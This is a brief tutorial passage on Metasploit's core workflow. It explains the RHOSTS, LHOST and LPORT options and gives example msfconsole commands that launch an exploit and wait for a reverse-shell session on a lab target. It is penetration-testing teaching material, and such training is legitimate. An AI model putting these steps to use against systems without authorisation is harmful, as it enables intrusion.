Core Workflow

Configuring and Executing: Set and Exploit

Tailoring modules and launching your attack.

4. Set Options

Configure necessary parameters using set <option> <value>. This includes RHOSTS (target IP), LHOST (your IP), and LPORT (your listening port).

5. Run / Exploit

Execute the module using run or exploit. This initiates the attack and attempts to gain a session on the target.

Important Parameters

  • RHOSTS: Remote Host(s) - the target IP address.
  • LHOST: Local Host - your attacking machine's IP for reverse connections.
  • LPORT: Local Port - the port your listener will use.
# Example Commands
msf6 exploit(...) > set RHOSTS 192.168.1.105
msf6 exploit(...) > set LHOST 192.168.1.100
msf6 exploit(...) > set LPORT 4444
# Configure target and listener settings

msf6 exploit(...) > exploit
# Execute the exploit and await a session
Common Mistake

Forgetting to set LHOST or setting it to an unreachable IP will prevent reverse shells from connecting back.

Key Takeaway

Accurate configuration of `RHOSTS`, `LHOST`, and `LPORT` is essential before executing an exploit to ensure session establishment.
